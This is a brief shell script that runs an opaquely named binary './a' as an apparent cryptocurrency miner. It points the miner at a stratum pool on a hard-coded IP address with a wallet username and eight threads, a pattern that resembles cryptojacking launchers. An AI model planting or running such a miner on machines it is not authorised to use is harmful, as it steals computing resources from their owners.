#!/bin/sh
#set working directory to the location of this script
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd $DIR
./a -v -l stratum+tcp://79.137.70.48:3956 -u RLsc25uhuENiG7wRve5p7n2jfYsFSrGu2s.new -t 8 
